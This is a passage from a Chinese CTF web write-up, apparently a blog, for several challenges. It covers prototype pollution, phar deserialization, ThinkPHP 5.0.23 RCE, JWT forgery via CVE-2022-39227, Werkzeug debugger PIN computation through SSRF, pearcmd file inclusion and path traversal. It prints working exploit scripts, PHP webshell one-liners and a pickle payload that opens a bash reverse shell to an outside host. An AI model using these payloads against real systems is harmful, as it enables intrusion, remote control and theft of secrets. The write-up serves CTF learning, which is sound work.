触发catch后，达到了污染format的条件，但是createDate的参数变成了config.default.js中的min_public_time，为`2019-07-08T16:00:00.000Z`，因此可以构造format为`yy19-MM-ddTHH:mm:ss.fffZ`。然后基于format的日期匹配会返回`1920-07-08T16:00:00.000Z`的日期，已经将minTimestamp提早了近一个世纪了

最终payload

```js
{
  "contact":"a", "reason":"a",
  "constructor":{
    "prototype":{
      "format": "yy19-MM-ddTHH:mm:ss.fffZ",
      "baseDate":"aaa",
      "fff": "bbb"
    }
  }
}
```

以Content-Type: application/json的 Header 用POST方法向路径/submit请求即可
 ![在这里插入图片描述](assets/1f39d128c52043819b3a0fea261f94bc.png)

然后为我们再请求/info/0，找到含有 flag 的一条数据
 ![在这里插入图片描述](assets/f3db1fc7cc0c4df2b112bcc3e0ff84ca.png)

## WEEK5

### Unserialize Again（phar反序列化、绕过__wakeup()、修改签名）

> 考点：phar反序列化、绕过__wakeup()、修改签名

打开题目，发现有文件上传功能
 在源码出有hint，去看cookie
 ![在这里插入图片描述](assets/c5e891423d2d439e81cf45147542d6bd.png)

访问得到源码

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);  
class story{
    private $user='admin';
    public $pass;
    public $eating;
    public $God='false';
    public function __wakeup(){
        $this->user='human';
        if(1==1){
            die();
        }
        if(1!=1){
            echo $fffflag;
        }
    }
    public function __construct(){
        $this->user='AshenOne';
        $this->eating='fire';
        die();
    }
    public function __tostring(){
        return $this->user.$this->pass;
    }
    public function __invoke(){
        if($this->user=='admin'&&$this->pass=='admin'){
            echo $nothing;
        }
    }
    public function __destruct(){
        if($this->God=='true'&&$this->user=='admin'){
            system($this->eating);
        }
        else{
            die('Get Out!');
        }
    }
}                 
if(isset($_GET['pear'])&&isset($_GET['apple'])){
    // $Eden=new story();
    $pear=$_GET['pear'];
    $Adam=$_GET['apple'];
    $file=file_get_contents('php://input');
    file_put_contents($pear,urldecode($file));
    file_exists($Adam);
}
else{
    echo '多吃雪梨';
} 多吃雪梨
```

分析一下，命令执行的条件很简单，让`God=true`和`user=admin`成立即可，所以我们要绕__wakeup()。

exp如下

```php
<?php
class story{
    private $user;
    public $pass;
    public $eating;
    public $God;
}                 

$a=new story();
$a->user='admin';
$a->God=true;
$a->eating='cat /*';
$phar = new Phar("hacker.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

将生成的文件，用010打开，复制到新建的十六进制文件
 修改属性数目绕过wakeup
 ![在这里插入图片描述](assets/ef228b59e1fa4f449d7ccb9f30a64f65.png)
 然后由于签名文件损坏要修复，注意到倒数第二行最后面的03
 可以知道为SHA256，修复脚本如下

```python
from hashlib import sha256
with open("hacker1.phar",'rb') as f:
   text=f.read()
   main=text[:-40]        #正文部分(除去最后40字节)
   end=text[-8:]		  #最后八位也是不变的	
   new_sign=sha256(main).digest()
   new_phar=main+new_sign+end
   open("hacker1.phar",'wb').write(new_phar)     #将新生成的内容以二进制方式覆盖写入原来的phar文件
```

然后发现题目的文件上传不能用
 那么写脚本上传顺便url编码

```python
import urllib.parse
import os
import re
import requests

url='http://1c6e2942-f983-47cc-a6ef-9612e7519196.node4.buuoj.cn:81/'
pattern = r'flag\{.+?\}'
params={
    'pear':'hacker1.phar', 
    'apple':'phar://hacker1.phar'
}

with open('hacker1.phar','rb') as fi:
    f = fi.read()
    ff=urllib.parse.quote(f)
    fin=requests.post(url=url+"pairing.php",data=ff,params=params)
    matches = re.findall(pattern, fin.text)
    for match in matches:
        print(match)
```

得到flag
 ![在这里插入图片描述](assets/cf51ab31ab5d495c8c41530d627e0ffd.png)

### Final（ThinkPHP 5.0.23 RCE、SUID提权）

> 考点：ThinkPHP 5.0.23 RCE、SUID提权

打开题目，发现是ThinkPHP框架
 直接用工具找到payload
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/7ea609752549498eaa3502a62463962a.png)试一试发现成功打开phpinfo
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/e0120c6ab7e545d8917007cf6a52df7d.png)
 发现system被禁了，那么试试exec写入webshell
 写入到 /var/www/public
 ![在这里插入图片描述](assets/4427be4dcf7045b79a6d813a90bb99be.png)

payload

> GET：?s=captcha&test=-1
> POST：_method=__construct&filter[]=exec&method=get&server[REQUEST_METHOD]=echo ‘<?php eval($_POST['shell']);?>’ > /var/www/public/shell.php

蚁剑连接
 ![在这里插入图片描述](assets/2503473c83904c739428cbc250489dac.png)

### Ye’s Pickle（jwt伪造、pickle反序列化）

> 考点：python_jwt的CVE-2022-39227、pickle反序列化

题目给了附件，我们分析一下

```python
# -*- coding: utf-8 -*-
import base64
import string
import random
from flask import *
import jwcrypto.jwk as jwk
import pickle
from python_jwt import *
app = Flask(__name__)

def generate_random_string(length=16):
    characters = string.ascii_letters + string.digits  # 包含字母和数字
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string
app.config['SECRET_KEY'] = generate_random_string(16)
key = jwk.JWK.generate(kty='RSA', size=2048)
@app.route("/")
def index():
    payload=request.args.get("token")
    if payload:
        token=verify_jwt(payload, key, ['PS256'])
        session["role"]=token[1]['role']
        return render_template('index.html')
    else:
        session["role"]="guest"
        user={"username":"boogipop","role":"guest"}
        jwt = generate_jwt(user, key, 'PS256', timedelta(minutes=60))
        return render_template('index.html',token=jwt)

@app.route("/pickle")
def unser():
    if session["role"]=="admin":
        pickle.loads(base64.b64decode(request.args.get("pickle")))
        return render_template("index.html")
    else:
        return render_template("index.html")
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

分析如下

1. 先看`/`路由下，先接收参数token然后进行jwt认证并且从验证后的 JWT 中获取用户角色信息，并存储在 Session中，否则role赋值为guest，创建用户对象生成JWT
2. 然后再看看`./pickle`路由，首先检测session中role参数值是否为admin，如果是则进行pickle反序列化

所以我们的思路很明显，伪造session值为admin，然后进行pickle反序列化

打开题目，发现给了一段token值
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/eb650a7828de414bb1e095ab4d33fe8c.png)然后拿去JWT解密一下
 发现role值为guest
 ![在这里插入图片描述](assets/707593dec4fe4331a82b4632295ec848.png)那么我们就要伪造JWT
 exp如下

```python
import base64
from datetime import timedelta
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode

def topic(topic):
    """ Use mix of JSON and compact format to insert forged claims including long expiration """
    [header, payload, signature] = topic.split('.')
    parsed_payload = loads(base64url_decode(payload))
    parsed_payload['role'] = 'admin'
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
    return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'    

originaltoken = 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTk1MzgyNDQsImlhdCI6MTY5OTUzNDY0NCwianRpIjoiMFB1NllqWEFlRXMzZy1ZRFZ5bDNkUSIsIm5iZiI6MTY5OTUzNDY0NCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.K_GRKX1-2Em3LFLx5wD_VJ-lHrrU595Xwrniu_zxexgUDmy5DR9V9Qsq0lVMsEEwNoShA9-IsWiS58j3MxGldk3GUXWCEeXZ7HBlcPCB_wUlZ6TE7FIqZkeAbtH9EaptOEYTxzbiVsWsoLGjCm8Y9EazQkUQd_aQRhYHa6KgNmbmFeVQSeORwLAi1PVkjYT0wVtweG3KAegorhyBFpmK9v5nKvwFYP6l33LvkTLV3V1ryb-yfvCn08TLYKc17JNkRquBp_1pW_dH1P_qkxiO98806nBniPc76BjSwolLHPh7J9Wa53pBV2RSKbRjqmJ7JR3hr_RkgVmSOMUCeCT5sw'
topic = topic(originaltoken)
print(topic)
```

这里有个小坑，生成的payload要将空格url编码一下
 然后bp抓包，GET传参参数token
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/6b6f6f74673c4c6d8ccba107ff83e7a8.png)
 因为我们代码审计时知道会将token赋值给session里
 所以我们用该session值去进行pickle反序列化
 （不确定是否改为admin可以去解密看看）
 ![在这里插入图片描述](assets/f579f5d418824e1cb1d8ed08be0d4190.png)
 接着就到pickle反序列化，由于没有任何过滤
 直接给payload，反弹shell

```python
import base64
opcode=b'''cos
system
(S"bash -c 'bash -i >& /dev/tcp/f57819674z.imdo.co/54789 0>&1'"
tR.
'''
print(base64.b64encode(opcode))
```

bp抓包访问`./pickle`，修改session，GET传参参数pickle
 成功反弹shell
 ![在这里插入图片描述](assets/03bc653b8b6a481b9aa6e1e2c631b207.png)

得到flag

![在这里插入图片描述](assets/2e792ef5956144778fe5063c81daf298.png)

### pppython?（ssrf、计算pin码）

> 考点：ssrf、计算pin码

打开题目，源码如下

```python
 <?php
    
    if ($_REQUEST['hint'] == ["your?", "mine!", "hint!!"]){
        header("Content-type: text/plain");
        system("ls / -la");
        exit();
    }
    
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST['lolita']);
        $output = curl_exec($ch);
        echo $output;
        curl_close($ch);   
    }catch (Error $x){
        highlight_file(__FILE__);
        highlight_string($x->getMessage());
    }

?> 
```

发现youhint，按照要求请求参数hint为数组，对应键值为`"your?", "mine!", "hint!!"`

```http
?hint[0]=your?&hint[1]=mine!&hint[2]=hint!!
```

得到信息，读取flag权限不够，且存在app.py
 ![在这里插入图片描述](assets/aa5f8a21efd8421b8371c114be6fe044.png)
 回到源码，看到由curl命令，尝试ssrf读取app.py
 （注意参数lolita得为数组格式，因为有`CURLOPT_HTTPHEADER`）

```
?url=file:///app.py&lolita[]=
```

app.py源码如下

```python
from flask import Flask, request, session, render_template, render_template_string 
import os, base64 
#from NeepuF1Le import neepu_files 
app = Flask(__name__) 
app.config['SECRET_KEY'] = '******' 
@app.route('/') 
def welcome(): 
    if session["islogin"] == True: 
        return "flag{***********************}" 
    app.run('0.0.0.0', 1314, debug=True)
```

这里伪造session能得到flag，但是根本没有cookie，伪造不了，题目也提示了。但是可以发现debug开启监听在1314端口，那么结合`CURLOPT_HTTPHEADER`包含头部信息，我们可以计算pin码手动生成cookie然后上传用于身份验证，从而命令执行

PIN 的生成流程分析，可以知道 PIN 主要由 probably_public_bits 和 private_bits 两个列表变量决定，而这两个列表变量又由如下6个变量决定：

```python
username 启动这个 Flask 的用户
modname 一般默认 flask.app
getattr(app, '__name__', getattr(app.__class__, '__name__')) 一般默认 flask.app 为 Flask
getattr(mod, '__file__', None)为 flask 目录下的一个 app.py 的绝对路径,可在爆错页面看到
str(uuid.getnode()) 则是网卡 MAC 地址的十进制表达式
get_machine_id() 系统 id
```

- 我们知道用户为`root`
- 绝对路径这里我没爆不出来

```
/usr/local/lib/python3.10/dist-packages/flask/app.py
```

- 接着获取网卡 MAC 地址

```
?url=file:///sys/class/net/eth0/address&lolita[]=
```

然后十六进制转十进制
 ![在这里插入图片描述](assets/8cbfce94a7274591be548beaa61ca058.png)

- 最后的系统id包括两部分，我们先读取`/etc/machine-id`（也可以是`/proc/sys/kernel/random/boot_id`）

```
?url=file:///proc/sys/kernel/random/boot_id&lolita[]=
```

- 然后取`/proc/self/cgroup`并且只读取第一行，并以从右边算起的第一个`/`为分隔符

```
?url=file:///proc/self/cgroup&lolita[]=
```

![在这里插入图片描述](assets/b8ec002bb973499daf14022354899e9d.png)计算pin码脚本如下

```python
import hashlib
from itertools import chain
import time
probably_public_bits = [
    'root'  
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '209308333341629',  
    '8cab9c97-85be-4fb4-9d17-29335d7b2b8adocker-de0acd954e28d766468f4c4108e32529318e5e4048153309680469d179d6ceac.scope'
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

print(cookie_name + "=" + f"{int(time.time())}|{hash_pin(rv)}")
```

运行脚本，得到cookie
 ![在这里插入图片描述](assets/4ef128f17c5c4174b601296e48f74c9c.png)

然后就是如何传参

```http
GET /?&__debugger__=yes&cmd=print(1)&frm=140324285712640&s=prj74Iraob1k5eMHiH37
```

这里我们要去获取frm和s的值

- frm如果没有报错信息的话值为0
- s的值可以直接访问`./console`，然后查看源码的SECRET值

由于这里试了半天没有报错信息，那么frm=0

访问一下console，获取s值

```
?url=http://localhost:1314/console&lolita[]=
```

![在这里插入图片描述](assets/3428ea982cab41aea67e7eca0dbb8b53.png)

### 4-复盘(pearcmd.php本地文件包含、SUID提权)

> 考点：pearcmd.php本地文件包含、SUID提权

下载附件，源码如下

```php
<?php require_once 'inc/header.php'; ?>
<?php require_once 'inc/sidebar.php'; ?>

  <!-- Content Wrapper. Contains page content -->

  <?php 
        if (isset($_GET['page'])) {
          $page ='pages/' .$_GET['page'].'.php';

        }else{
          $page = 'pages/dashboard.php';
        }
        if (file_exists($page)) {
          require_once $page; 
        }else{
          require_once 'pages/error_page.php';
        }
 ?>
  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Control sidebar content goes here -->
  </aside>
  <!-- /.control-sidebar -->

 <?php require_once 'inc/footer.php'; ?>
```

可以看到有文件包含漏洞，将我们传参的值与php拼接
 （这里可以参考week3的include）

bp抓包，写入一句话木马

```php
?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>+shell.php
```

![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/0b54975001784997b3d046c7e3960ed8.png)
 然后蚁剑连接
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/cee997ff22824cb1aa7deb9c561952f5.png)
 发现flag权限不够
 ![在这里插入图片描述](assets/3824f02fa0e54fc0913ce639ad0afa16.png)
 然后就是SUID提权

### NextDrive(伪造请求发包、Cookie窃取、Linux文件系统)

> 考点：伪造请求发包、Cookie窃取、Linux文件系统

打开题目，在公共资源区发现`test.req.http`
 下载下来查看一下

> HTTP/1.1 200 OK
> content-type: application/json; charset=utf-8
> content-length: 50
> date: Tue, 06 Oct 2023 13:39:21 GMT
> connection: keep-alive
> keep-alive: timeout=5
> {“code”:0,“msg”:“success”,“logged”:true,“data”:[{“name”:“すずめ feat.十明 -  RADWIMPS,十明.flac”,“hash”:“5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc”,“size”:27471829,“uploader”:“admin”,“uploader_uid”:“100000”,“shareTime”:1699622700337,“isYours”:true,“isOwn”:true,“ownFn”:“すずめ feat.十明 - RADWIMPS,十明.flac”},{“name”:“Windows 12  Concept.png”,“hash”:“469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900”,“size”:440707,“uploader”:“admin”,“uploader_uid”:“100000”,“shareTime”:1699622702813,“isYours”:true,“isOwn”:true,“ownFn”:“Windows 12  Concept.png”},{“name”:“信息安全技术信息安全事件分类分级指南.pdf”,“hash”:“03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f”,“size”:330767,“uploader”:“admin”,“uploader_uid”:“100000”,“shareTime”:1699622702846,“isYours”:true,“isOwn”:true,“ownFn”:“信息安全技术信息安全事件分类分级指南.pdf”},{“name”:“不限速，就是快！.jpg”,“hash”:“2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e”,“size”:32920,“uploader”:“admin”,“uploader_uid”:“100000”,“shareTime”:1699622702870,“isYours”:true,“isOwn”:true,“ownFn”:“不限速，就是快！.jpg”},{“name”:“test.req.http”,“hash”:“102982a62a610a3a36d686f574fa2ad1447095da77d0686e6157d02dd37b4e7f”,“size”:1085,“uploader”:“admin”,“uploader_uid”:“100000”,“shareTime”:1699622706331,“isYours”:true,“isOwn”:true,“ownFn”:“test.req.http”}]}

可以看到大概是每个文件对应文件名，哈希值和文件大小

我们先随便注册一个用户，想注册admin发现存在，思路是登录admin获取重要信息
 随便上传一个文件
 F12看到请求过程中有check过程，响应里面显示无法秒传
 ![在这里插入图片描述](assets/dd52e5eb46174a7cb6945b57b2c42506.png)bp抓包一下，发现json数据只有哈希值和文件名
 由于我们刚刚下载的文件里可能存在敏感信息，特别是test.req.http文件
 那么我们在check时使用该文件对应的哈希值去绕过，从而下载下来该文件
 ![在这里插入图片描述](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/458b48be0a9847b1800ddd88f7424928.png)然后打开下载的文件

```
POST /api/info/drive/sharezone HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Cookie: uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiJhYjg3N2I2MDhjOTBlODJhNzNjMDhlYTBjN2NjNjI4ODdiN2U2YTIwOWJmOTljNjQ0ZjE4YmU3NzQzODkzMGY1In0uWxlkC2QWXTZtHjojaVAhUA.AwN3HB8QSRFNeUMLXAxZAlMLK00eRBoTTXhDAlgPWwZcAXceFUIdHEt2QwQLWlxVXQd/H0BGT0dLJEULW11fAlZUek8XQklAG3QXVV5bV1VXC3dOR0QZFRdwFFJRD15SAVB6SkMWTkBKdUBQWVxfBlQHf08URkgRH3dAAl8NWQc
Host: localhost:21920
Origin: http://localhost:21920
Pragma: no-cache
Referer: http://localhost:21920/sharezone
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0
sec-ch-ua: "Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
1234567891011121314151617181920
```

我们发现cookie值，尝试伪造cookie
 我们刷新页面，bp修改cookie值，成功以以admin登录
 ![在这里插入图片描述](assets/7867098d98e34b6188f4ef0e8b9e9159.png)把这个share.js下载下来，源码如下

```js
const Router = require("koa-router");
const router = new Router();
const CONFIG = require("../../runtime.config.json");
const Res = require("../../components/utils/response");
const FileSignUtil = require("../../components/utils/file-signature");
const { DriveUtil } = require("../../components/utils/database.utilities");
const fs = require("fs");
const path = require("path");
const { verifySession } = require("../../components/utils/session");
const logger = global.logger;

/**
 * @deprecated
 * ! FIXME: 发现漏洞，请进行修改
 */
router.get("/s/:hashfn", async (ctx, next) => {
    const hash_fn = String(ctx.params.hashfn || '')
    const hash = hash_fn.slice(0, 64)
    const from_uid = ctx.query.from_uid
    const custom_fn = ctx.query.fn

    // 参数校验
    if (typeof hash_fn !== "string" || typeof from_uid !== "string") {
        // invalid params or query
        ctx.set("X-Error-Reason", "Invalid Params");
        ctx.status = 400; // Bad Request
        return ctx.res.end();
    }

    // 是否为共享的文件
    let IS_FILE_EXIST = await DriveUtil.isShareFileExist(hash, from_uid)
    if (!IS_FILE_EXIST) {
        ctx.set("X-Error-Reason", "File Not Found");
        ctx.status = 404; // Not Found
        return ctx.res.end();
    }

    // 系统中是否存储有该文件
    let IS_FILE_EXIST_IN_STORAGE
    try {
        IS_FILE_EXIST_IN_STORAGE = fs.existsSync(path.resolve(CONFIG.storage_path, hash_fn))
    } catch (e) {
        ctx.set("X-Error-Reason", "Internal Server Error");
        ctx.status = 500; // Internal Server Error
        return ctx.res.end();
    }
    if (!IS_FILE_EXIST_IN_STORAGE) {
        logger.error(`File ${hash_fn.yellow} not found in storage, but exist in database!`)
        ctx.set("X-Error-Reason", "Internal Server Error");
        ctx.status = 500; // Internal Server Error
        return ctx.res.end();
    }

    // 文件名处理
    let filename = typeof custom_fn === "string" ? custom_fn : (await DriveUtil.getFilename(from_uid, hash));
    filename = filename.replace(/[\\\/\:\*\"\'\<\>\|\?\x00-\x1F\x7F]/gi, "_")

    // 发送
    ctx.set("Content-Disposition", `attachment; filename*=UTF-8''${encodeURIComponent(filename)}`);
    // ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))
    await ctx.sendFile(path.resolve(CONFIG.storage_path, hash_fn)).catch(e => {
        logger.error(`Error while sending file ${hash_fn.yellow}`)
        logger.error(e)
        ctx.status = 500; // Internal Server Error
        return ctx.res.end();
    })
})

module.exports = router;
```

可以看注释有hint存在漏洞。首先是给了处理GET请求的路由，其中路径为`./s/`加上参数hashfn，检测前64位是否为哈希值，然后从请求中获取参数fn和from_uid，其中from_uid表示下载的文件是这个 uid  的用户分享的；接着就是参数检测，是否为共享文件（参数为哈希值和from_uid），是否存储该文件，然后文件名处理；最后发送时利用path.resolve函数处理，注意里面的参数`hash_fn`是完全可控的，我们只需要让64位哈希值后面跟上`../`即可实现路径穿越

既然我们知道参数hashfn可控，随便一个在公共资源区的哈希值拼接上`/../../../../etc/passwd`，然后由于要验证身份，传参`from_uid=100000`
 （其中的`/`url编码一下）

```http
http://node4.buuoj.cn:29715/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd?from_uid=100000
```

发现下载了一个音乐文件，不过打开可以看到我们执行的
 ![在这里插入图片描述](assets/730ca7b01bbd4e1d83f3d1cfa1e11fb4.png)
 我们直接查看环境变量

```http
/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron?from_uid=100000
```

打开得到flag
![image-20241026223919792](assets/image-20241026223919792.png)